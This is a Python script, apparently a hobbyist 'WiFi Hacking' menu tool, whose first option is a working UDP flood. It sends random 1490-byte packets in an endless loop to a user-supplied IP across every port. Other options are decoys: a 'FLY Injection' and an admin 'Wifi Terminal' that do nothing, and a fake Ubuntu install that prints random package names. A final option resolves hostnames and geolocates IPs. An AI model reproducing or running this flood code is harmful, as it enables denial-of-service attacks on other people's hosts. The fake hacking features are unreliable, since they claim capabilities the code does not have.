#Import libraries
import sys
import os
import time
import socket
import random
import subprocess
import platform
import requests
#Import current time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
#Package List
characters = (
'a','b','c','d','e','f','g','h','i','j','k','l','m',
'n','o','p','q','r','s','t','u','v','w','x','y','z',
'A','B','C','D','E','F','G','H','I','J','K','L','M',
'N','O','P','Q','R','S','T','U','V','W','X','Y','Z')

#All defenitions
def showcommands():
	print("Commands:")

#Start DDos Attack
def startloop():
	sent = 0
	current_port = port
	while True:
		sock.sendto(bytes, (ip, current_port))
		sent += 1
		current_port += 1
		print(f"Sent {sent} packets to {ip} through port: {current_port}")
		if current_port == 65534 or current_port > 65534:
			current_port = 1

#Loading animation
def loadinganimation(): 
	number = 0
	for i in range(10):
		print(number, "%")
		number += 10
		time.sleep(0.1)
		os.system("clear")

#Get IP by http or https		
def get_hostname_IP():
    	print("Sheriff v20")
    	print("Made by CLOUD_STUDIOS")
    	hostname = input("Please enter website address (URL): ")
    	try:
    	   print("--------------------------------------")
    	   print (f'Hostname: {hostname}')
    	   print (f'IP: {socket.gethostbyname(hostname)}')
    	except socket.gaierror as error:
    		print (f'Invalid Hostname, error raised is {error}')

#Get hostname server info
def get_server_info():
    hostname = socket.gethostname()
    
    ip_address = socket.gethostbyname(hostname)
    
    os_name = platform.system()
    os_version = platform.version()
    os_release = platform.release()
    
    cpu_count = os.cpu_count()
    processor = platform.processor()
    
    server_info = {
        "Hostname": hostname,
        "IP Address": ip_address,
        "Operating System": f"{os_name} {os_release} (Version: {os_version})",
        "CPU": f"{processor} ({cpu_count} cores)"
    }
    
    return server_info

#Get location from IP Address    
def get_location(ip_address=""):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            data = response.json()
            location = {
                "IP": data.get("ip"),
                "City": data.get("city"),
                "Region": data.get("region"),
                "Country": data.get("country"),
                "Coordinates": data.get("loc"),
                "ISP": data.get("org")
            }
            return location
        else:
            return {"Error": f"Failed to fetch data. Status code: {response.status_code}"}
    except Exception as e:
        return {"Error": str(e)}

os.system("cls")
print("""
        
██╗    ██╗██╗███████╗██╗   ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗     
██║    ██║██║██╔════╝██║   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝     
██║ █╗ ██║██║█████╗  ██║   ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗    
██║███╗██║██║██╔══╝ ██║   ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║    
╚███╔███╔╝██║██║     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝    
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
                                 v:0.0.1


      .;'                     `;,     Author : creator_jakai
     .;'  ,;'             `;,  `;,   
    .;'  ,;'  ,;'     `;,  `;,  `;, 
    ::   ::   :   ( )   :   ::   ::   Contributors : None
    ':.  ':.  ':. /_\\ ,:'  ,:'  ,:'
     ':.  ':.    /___\\    ,:'  ,:'
      ':.       /_____\\      ,:'       Compatible with: Linux, Android & ChromeOS                               
               /       \\               Tools : WiFi/Hacking & Networking                                                              
    -------------------------------------------------------------------------  

            Menu:
            1) DDos Attack
            2) FLY Injection
            3) Wifi Terminal (Run admin level commands on network)
            4) Run Linux Ubuntu
            5) HTTP/HTTPS IP Finder (Sheriff)
            
            i) Info
            c) Credits
            0) Exit
    -------------------------------------------------------------------------  
""")

answer = input("Choice: ")
if answer == "1":
	os.system("clear")
	print(""" ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⣀⡀⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⣏⣭⣻⣛⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠘⠀⠈⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⠀⢀⣀⣶⣦⣶⣦⣄⡀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⣀⣴⣿⣿⣭⣭⣭⣿⣽⣿⣷⣀⣀⣾⡿⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⠘⢿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⠿⡋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⠀⠀⣀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
	print("DDos Attack")
	print("-"*25)
	ip = input("IP Target : ")
	port = int(input("Port : "))
	#Start Loading Animation
	loadinganimation()
	os.system("cls" if os.name == "nt" else "clear")
	#Start DDos Attack	
	startloop()

elif answer == "2":
	os.system("clear")
	print("FLY Injection")
	print("-"*25)
	input("IP Target: ")
	loadinganimation()

elif answer == "3":
	loadinganimation()
	time.sleep(1)
	print("Wifi Terminal v1.00.5iuq")
	print("Made by creator_jakai")
	print("Typ ¨help¨ to show all commands")
	print("Copyright 2024-2026 - All rights reserved")
	print("-"*25)
	while True:
		terminalinput = input(">"*3)
		if terminalinput == "help":
			showcommands()
		else:
			print("Invalid command :(")
			
elif answer == "4":
	loadinganimation()
	print("Downloading packeges...")
	for i in range(100):
		packagelist = random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), 	random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.				choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters)
		print("Downloading: ", packagelist, "...")
		time.sleep(0.1)
	print("""⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠁⠀⠀⠀⠀⠈⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣦⠀⠀⠀⠈⢻⣿⣿⣿
⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣶⣾⣷⣶⣆⠸⣿⣿⡟⠀⠀⠀⠀⠀⠹⣿⣿
⣿⠃⠀⠀⠀⠀⠀⠀⣠⣾⣷⡈⠻⠿⠟⠻⠿⢿⣷⣤⣤⣄⠀⠀⠀⠀⠀⠀⠘⣿
⡏⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⢹
⠁⠀⠀⢀⣤⣤⡘⢿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⠀⠀⠀⠀⠈
⠀⠀⠀⣿⣿⣿⡇⢸⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣉⣉⡁⠀⠀⠀⠀⠀⠀
⡀⠀⠀⠈⠛⠛⢡⣾⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⢀
⣇⠀⠀⠀⠀⠀⠀⠻⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠟⠀⠀⠀⠀⠀⠀⣸
⣿⡄⠀⠀⠀⠀⠀⠀⠙⢿⡿⢁⣴⣶⣦⣴⣶⣾⡿⠛⠛⠋⠀⠀⠀⠀⠀⠀⢠⣿
⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⢿⡿⠿⠏⢰⣿⣿⣧⠀⠀⠀⠀⠀⣰⣿⣿
⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⠟⠀⠀⠀⢀⣼⣿⣿⣿
⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⡀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿""")
	print("Ubuntu 24.04.4 LTS")
	print("-"*25)

elif answer == "5":
	get_hostname_IP()
	print()
	print("------------Your Device Info--------------")
	if __name__ == "__main__":
	   info = get_server_info()
	   for key, value in info.items():
	   	print(f"{key}: {value}")
	if __name__ == "__main__":
	   print()
	   print("-------------Server Location--------------")
	   ip = input("IP Adress: ")
	   location_info = get_location(ip)
	   for key, value in location_info.items():
	   	print(f"{key}: {value}")

elif answer == "i":
	print("Wifi Tools Official")
	print("Current version: v0.0.1")
	print("Copyright 2024-2026")
	print("All rights reserved")
	print("-"*20)
	print("Optimized for: ")
	print("-Linux")
	print("-ChromeOS")
	print("-Android")

elif answer == "c":
	print("Credits: ")
	print("creator_jakai - https://github.com/creatorjakai")
	print("Ha3MrX - https://github.com/Ha3MrX")

elif answer == "0":
	while True:
		break

else:
	print("Invalid number :(")